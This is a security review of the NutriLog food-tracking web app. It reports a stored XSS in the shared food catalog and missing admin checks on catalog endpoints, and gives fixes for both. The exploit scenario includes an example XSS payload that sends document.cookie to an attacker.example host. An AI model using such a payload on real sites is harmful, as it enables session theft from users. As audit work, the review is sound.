# NutriLog — Security Review

Ad hoc application security review, 26 July 2026. Scope: the full app
(`app.py`, `auth.py`, `db.py`, `vision.py`, `barcode.py`, `oura.py`,
`health.py`, `mcp_server.py`, `public/*.html`) — not limited to the current
branch's diff, which is documentation-only. This is a point-in-time
snapshot; re-run after significant changes to auth, the food catalog API,
or the MCP/Copilot Studio integration.

## Summary

| # | Finding | Severity |
|---|---|---|
| 1 | Stored XSS via the shared food catalog (category/food item name, notes) | High |
| 2 | No admin-role check on catalog-mutating endpoints | Medium |

Everything else reviewed — SQL query construction, Easy Auth header trust
model, Oura OAuth `state` CSRF check, the `/api/health/ingest` bearer-token
auth, barcode-code sanitization, MCP request handling — held up; no
injection, auth-bypass, or cross-user data leakage found there. Multi-user
data isolation (the thing specifically asked about earlier) is correctly
enforced: every food-log, Oura, and iPhone Health query is scoped by
`user_id`, and the Oura OAuth callback validates `state == g.user['id']`
before accepting a token exchange.

---

# Finding 1: Stored XSS via shared food catalog

* **Severity**: High
* **Category**: `xss` (stored)
* **Confidence**: 0.85

## Description

`category.name`, `category.icon`, `food_item.name`, and `food_item.notes`
are accepted from the client with no sanitization (`app.py:96-134` for
categories, `app.py:158-201` for food items — only presence/type is
checked, never content), stored as-is, and then injected into the DOM via
unescaped template-literal `innerHTML` assignments in three pages:

- `public/index.html:362-387` (`renderSlots` — `cat.icon`, `cat.name`, and
  per-entry `e.food_name`)
- `public/index.html:444-451` (`renderFoodList` — `f.name` in the
  add-food search results)
- `public/admin.html:361-372` (`renderCatList` — `cat.icon`, `cat.name`)
- `public/admin.html:408-424` (`renderFoodTable` — `f.name`, `f.notes`)

Because `categories`/`food_items` are an intentionally **global, shared**
catalog (not per-user data — see `CLAUDE.md`), anything written into it by
one signed-in user renders, unescaped, in every other signed-in user's
browser, including the admin's.

There's a second, lower-bar injection path: `/api/barcode-lookup`
(`app.py:421-463`) takes `product['name']` straight from Open Food Facts
(`barcode.py:41`, a public, community-editable database) and inserts it
into `food_items.name` with no sanitization either. Anyone can edit a
product's name on Open Food Facts; the next NutriLog user to scan that
barcode pulls the payload straight into the shared catalog — no NutriLog
account needed at all.

## Exploit Scenario

A signed-in user (or anyone who edits a product entry on Open Food Facts
that a NutriLog user later scans) creates/edits a food item with:

```
name: <img src=x onerror="fetch('https://attacker.example/c?d='+document.cookie)">
```

The next time *any* user — including the admin — opens `/`, `/admin`, or
adds a food item to their log, the payload executes in their authenticated
session. Since the app's only session mechanism is the Easy Auth cookie,
this lets an attacker exfiltrate whatever's reachable from that session
(cookie, or more directly, issue authenticated `fetch()` calls to
`/api/export`, `/api/log`, or catalog-mutating endpoints as the victim) —
including reaching the admin's session, which has no additional privilege
check today (see Finding 2) but does mean any admin-only workflows added
in future would be exposed to the same payload.

## Recommendation

Escape all catalog- and log-derived strings before inserting into
`innerHTML` — either switch these specific interpolations to
`textContent`/`createElement`, or add a small `escapeHtml()` helper and
apply it to every `cat.name`, `cat.icon`, `f.name`, `f.notes`, and
`e.food_name` interpolation in `index.html` and `admin.html`. Also worth
doing server-side: strip or reject HTML-significant characters from
`name`/`notes`/`icon` in the `/api/categories` and `/api/food-items`
handlers, and from `product['name']` in `barcode.py`'s `lookup()`, as
defense in depth for the Open Food Facts path in particular (that data
never passes through a NutriLog account at all).

---

# Finding 2: No admin-role check on catalog-mutating endpoints

* **Severity**: Medium
* **Category**: `broken_access_control`
* **Confidence**: 0.75

## Description

`/api/categories` (POST/PUT/DELETE) and `/api/food-items` (POST/PUT/DELETE)
sit behind the same blanket `before_request` check as every other `/api/*`
route (`app.py:38-41`) — any authenticated user, not just an app admin, can
create, edit, or delete entries in the **shared, global** food catalog used
by every user. `HANDOVER.md`/the original plan note this was an intentional
simplification for a 2-user app ("Admin panel stays open to any
authenticated user, not just Ruffy"), so this may be a deliberate tradeoff
rather than an oversight — flagging it because the blast radius grows with
every user added to the Entra allow-list going forward, and it compounds
Finding 1 (any signed-in user can also inject the XSS payload, not just an
admin).

## Exploit Scenario

Any user assigned in Entra ID (today: `ruffy@kingroup.com.au`,
`admin_mwebb@kingroup.com.au`; potentially more in future) can call
`DELETE /api/categories/<id>` or `DELETE /api/food-items/<id>` and remove
catalog entries relied on by every other user's historical log data, or
overwrite a shared item's nutrition values so every user's calorie totals
become wrong.

## Recommendation

If the catalog is meant to be admin-managed rather than user-managed (as
`README.md`'s "Admin" description implies), add a role check — e.g. a
`users.is_admin` column checked in the catalog-mutating routes — rather
than relying on "everyone currently assigned happens to be trusted." If
letting every signed-in user manage the shared catalog is in fact the
intended design, no change is needed beyond documenting it explicitly as a
conscious tradeoff (it currently reads as a passing note, not a decision).

---

## Areas checked with no findings

- **SQL injection**: every query in `app.py`, `db.py`, `oura.py`, `health.py`,
  `mcp_server.py` uses parameterized `?` placeholders; no string-formatted
  SQL anywhere.
- **Path traversal**: `/public/<path:filename>` uses Flask's
  `send_from_directory`, which normalizes and rejects `..` traversal.
- **SSRF**: the only user-influenced outbound HTTP call is
  `/api/barcode-lookup` → `barcode.py:lookup()`, and the barcode is
  stripped to digits-only (`re.sub(r'\D', '', code)`) before being placed
  in the URL *path* of a fixed host (`world.openfoodfacts.org`) — no
  attacker control over host or scheme.
- **Auth bypass**: `auth.py` trusts `X-MS-CLIENT-PRINCIPAL-*` headers, which
  is safe specifically because Azure App Service Easy Auth strips any
  client-supplied copies of these headers before injecting its own — this
  is the standard, documented Easy Auth trust model, not a gap introduced
  by this app.
- **Cross-user data leakage**: every food-log, Oura, and iPhone Health query
  filters by `user_id` (verified across `app.py`, `oura.py`, `health.py`,
  and `mcp_server.py`'s tool handlers); the Oura OAuth `state` parameter is
  checked against `g.user['id']` before a token exchange is accepted
  (`app.py:489`), preventing one user's OAuth callback from being bound to
  another user's account.
- **`/api/health/ingest` token auth**: token lookup is a straight DB
  equality check, not constant-time — a theoretical timing side-channel,
  but not practically exploitable over a network and excluded per standard
  triage guidance on theoretical timing attacks.
